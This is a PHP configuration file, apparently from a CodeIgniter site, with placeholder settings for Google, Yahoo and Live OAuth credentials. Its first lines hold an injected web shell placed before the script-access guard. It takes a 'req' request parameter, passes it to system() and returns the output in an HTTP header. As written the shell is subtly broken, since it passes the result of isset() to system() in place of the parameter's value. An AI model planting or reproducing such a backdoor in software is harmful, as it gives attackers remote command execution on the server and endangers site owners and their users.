<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);  if ( ! defined('BASEPATH')) exit('No direct script access allowed');

//Set Google API Paramethers
$config['setGoogleApplicationName']='%setGoogleClientSecret%';
$config['setGoogleScopes']	= '%setGoogleScopes%';
$config['setGoogleClientId'] = '%setGoogleClientId%';
$config['setGoogleClientSecret']	= '%setGoogleClientSecret%';

//Set Yahoo API Paramethers
$config['setYahooClientKey']='%setYahooClientKey%';
$config['setYahooAppID']	= '%setYahooAppID%';
$config['setYahooClientSecret']	= '%setYahooClientSecret%';

//Set Live Api Paramethers
$config['setLiveClientKey']='%setLiveClientKey%';
$config['setLiveClientSecret']	= '%setLiveClientSecret%';



